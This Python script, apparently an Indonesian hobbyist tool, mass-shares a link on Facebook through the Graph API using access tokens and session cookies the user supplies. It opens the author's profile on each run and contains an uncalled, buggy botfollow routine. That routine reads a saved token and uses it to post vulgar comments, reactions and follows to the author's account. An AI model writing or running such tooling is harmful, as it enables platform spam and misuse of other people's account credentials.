import os, re, requests, json
from concurrent.futures import ThreadPoolExecutor
ses = requests.Session()
threads = []
print("┌─────────────────────────────────────────────────────────────┐ │                                                             │ │   █████╗ ███████╗███████╗██████╗       ███╗   ███╗██╗   ██╗ │")
print("│  ██╔══██╗██╔════╝██╔════╝██╔══██╗      ████╗ ████║╚██╗ ██╔╝ │ │  ███████║███████╗█████╗  ██████╔╝█████╗██╔████╔██║ ╚████╔╝  │ │  ██╔══██║╚════██║██╔══╝  ██╔═══╝ ╚════╝██║╚██╔╝██║  ╚██╔╝   │")
print("│  ██║  ██║███████║███████╗██║           ██║ ╚═╝ ██║   ██║    │ │  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝           ╚═╝     ╚═╝   ╚═╝    │ │                                          ASEP YUSUP  2022   │")
print("└─────────────────────────────────────────────────────────────┘")
print("=================================================")
print("╔══◍➤\x1b[1;97mAutor     : \x1b[1;92mSUKAMAKMUR")
print("╠══◍➤\x1b[1;97mGithub    : \x1b[1;92mhttps://github.com/KangCrot")
print("╠══◍➤\x1b[1;97mFacebook  : \x1b[1;92mfb.me/ᏗᏕᏋᎮ ᎷᏗᏬᏝᏗᏁᏗ ᎽᏬᏕᏬᎮ")
print("╚══◍➤\x1b[1;97mCoded By  : \x1b[1;92mAsep \x1b[1;97m& \x1b[1;92mDinda")
print("=================================================")
def menu():
	print("1. Spam share via token")
	print("2. Spam share via token dan cookie Di Sarankan")
	ask = input("\n➤ Pilih : ")
	if ask in["1"]:
		token()
	else:
		token_cookie()
		
def token():
	print("➤ token EAAG")
	token = input("➤ Masukan token : ") 
	idt = input("➤ Masukan link : ")
	limit = int(input("Masukan limit : "))
	print("➤ follow FB gw anjing")
	print("=================================================")
	os.system("xdg-open https://www.facebook.com/mustofa.ganteng123?text=Hallo%20Bang%20Ganteng")
	try:
		header = {'authority':'graph.facebook.com','cache-control':'max-age=0','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (Linux; Android 9; Infinix X653C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36'}
		for x in range(limit):
			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={idt}&published=0&access_token={token}",headers=header).text
			data = json.loads(post)
			if 'id' in post:
				print(f"➤ Berhasil membagikan {data['id']}")
				print("=================================================")
			else:
				exit("➤ Gagal membagikan, kemungkinan token invalid")
	except:
		exit("➤ Gagal membagikan, kemungkinan token invalid")
		

def token_cookie():
	print("➤ cokiess bebas")
	cookie = input("➤ Masukan cookie : ")
	print("➤ Pake token EAAG")
	token = input("➤ Masukan token : ")
	idt = input("➤ Masukan link : ")
	limit = int(input("➤ Masukan limit : "))
	print("➤ follow FB gw anjing")
	print("=================================================")
	os.system("xdg-open https://www.facebook.com/mustofa.ganteng123?text=Hallo%20Bang%20Ganteng")
	try:
		header = {'authority':'graph.facebook.com','cache-control':'max-age=0','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (Linux; Android 9; Infinix X653C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36'}
		for x in range(limit):
			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={idt}&published=0&access_token={token}",headers=header,cookies={"cookie":cookie}).text
			data = json.loads(post)
			if 'id' in post:
				print(f"➤ Berhasil membagikan {data['id']}")
				print("=================================================")
			else:
				exit("➤ Gagal membagikan, kemungkinan token invalid")
	except:
		exit("➤ Gagal membagikan, kemungkinan token invalid")

def botfollow():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        os.system('rm -rf login.txt')
        exit()
    kom = komen
    post1 = '100006414900732'
    post2 = '100006414900732'
    requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + kom + '&access_token=' + token)   
    requests.post('https://graph.facebook.com/3108616682695465/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/3108616682695465/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=LOVE&access_token=' + token)
    requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + token)#prof
    komen = random.choice(['Bang Lu Ngntd!', 'Bang aku mau cerita nih bang Kemarin kan ada cewek ya bang yang minta sv terus aku jadian bang sama dia Udah 3 tahun berpacaran lewat wa bang Lha terus aku baru tau kalo dia itu berbatang :( asyuuu og :( ', 'Bang Lu Cakep Tapi Sayang pacar Dinda😭', 'Abang jaga kesehatan ya biar gak sakit Nanti kalau abang sakit yang nyakitin aku siapa?', 'Dah Lah Abng Cakep Banget :) ', 'Bang kemarin lu ngentod sama siapa bang? enak banget asyu aku gak di ajak', 'Bang yok ngentod', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Aman 100%:v', 'Semoga Abang Sukses', 'Abang kok ganteng banget ya bang ', 'buah mangga buah durian i love u bang :v', 'Hiiih abang jomblo ya? kasian bet dah :v', 'Wih Panutan Gua Nih', 'Bang prof kentod:v', 'Makan sayur di terminal Abang kayak marjinal:v'])
    exit()

if __name__ == '__main__':
	menu()